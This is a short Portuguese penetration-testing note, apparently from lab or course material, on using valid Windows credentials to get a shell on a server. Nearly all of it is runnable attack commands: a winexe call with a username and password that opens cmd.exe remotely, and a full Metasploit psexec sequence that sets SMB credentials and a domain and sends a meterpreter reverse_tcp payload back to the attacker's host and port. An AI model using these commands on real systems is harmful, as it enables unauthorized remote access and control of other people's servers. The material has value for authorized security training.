<h1 align="center"> Obtendo shell atraves das credenciais validas</h1>
<hr>

Uma coisa interessante quando temos credenciais validas , eh usar essas credenciais para obter uma shell no servidor.


Vamos suport que o TS nao tivesse sido habilitado e so tivessemos conseguido validar o SMB por exemplo. Poderiamos testar essas credenciais para obter e executar comandos nesse servidor. Por exemplo.

Existe um utilitario chamado <span style='color:var(--mk-color-red)'>winexe</span> no Kali Linux onde passamos o usuario  a senha 
```sh
winexe -U rogerio%Roger@10 //<IPDOSERVIDOR> cmd.exe
```

Podemos tambem usar o metasploit usando o `psexec`
```sh
search psexec
msf5 > use exploit/windows/smb/psexec
msf5 > exploit(windows/smb/psexec) > show options
msf5 > set RHOST <IP DO SERVIDOR>
msf5 > set SMBUser rogerio
msf5 > set SMBPass roger@10
msf5 > set SMBDomain gbusiness
msf5 > set payload windows/x64/meterpreter/reverse_tcp
msf5 > set LHOST <NOSSO IP>
msf5 > set LPORT 8444
msf5 > exploit
```